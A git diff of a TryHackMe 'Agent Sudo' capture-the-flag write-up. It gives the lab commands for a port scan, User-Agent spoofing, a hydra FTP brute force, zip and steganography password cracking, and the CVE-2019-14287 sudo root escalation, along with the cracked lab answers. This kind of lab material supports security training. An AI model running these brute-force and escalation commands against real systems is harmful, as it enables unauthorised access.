@@ -1,15 +1,24 @@
 Agent Sudo (TRYHACKME) WriteUp
 '''
 
-#1	
+#1
+
 How many open ports?
-	nmap <ip>
+
+nmap <ip>
+	
 Ans:-3
-#2	
+
+#2
+
 How you redirect yourself to a secret page?
+
 Ans:- User-Agent
+
 curl http://10.10.66.62 -H "User-Agent: C" - L
 
+
+Output:-
 '''
 Attention chris, <br><br>
 
@@ -20,36 +29,41 @@ Agent R
 '''
 
 #3	
+
 What is the agent name?
 Ans:- chris
 
 
-+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#1
 
-#1	
 FTP password
 
 hydra -l chris -P /file/dest/rockyou.txt ftp://10.10.66.62
 Answer :- crystal
 
-#2	
+#2
+
 Zip file password
+
 binwalk -e image.png
 zip2john file.zip > hash.txt
 john hash.txt --wordlist=rockyou.txt
 Answer :- alien
 
 #3	
+
 steg password
 steghide extract -sf image.png
 Answer :- Area51
 
 #4	
+
 Who is the other agent (in full name)?
 
 Answer :- james
 
 #5	
+
 SSH password
 
 Answer :- hackerrules
@@ -57,6 +71,7 @@ Answer :- hackerrules
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 #1
+
 CVE number for the escalation 
 
 (Format: CVE-xxxx-xxxx)
@@ -71,6 +86,7 @@ CVE-2019-14287 : - To Get Root access we can try to mention a user that doesn't 
 sudo -u#-1 /bin/bash
 
 #2	
+
 What is the root flag?
 
 Answer: ********************************
